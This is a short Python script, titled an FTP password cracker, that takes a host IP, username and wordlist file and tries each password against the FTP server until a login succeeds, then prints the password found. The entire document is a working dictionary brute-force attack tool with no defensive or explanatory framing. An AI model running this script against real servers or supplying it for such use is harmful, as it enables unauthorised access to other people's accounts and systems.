#FTP Password Cracker

#imports
import ftplib

host = input("Enter host IP Address: ")  #input the host IP Address
user = input("Enter host username: ")  #host username
PassWordFile = input("Password Test File Path: ")  #password text file path

passWord = open(PassWordFile, "r")  #open password file

for passW in passWord.readlines():  #read password file lines
    passW = str(passW).split('\n')[0]  #get password

    try:
        ftp = ftplib.FTP(host, user, passW)  # FTP login if successful
        print("[+] {0:*^50}".format(" Password Found "))
        print("[+] PassWord - {0}".format(passW))
        print("[+] {0:*^50}".format(""))
        break

    except:
        print("[-] Password Attempt ~ {0}".format(passW))

input()  #break
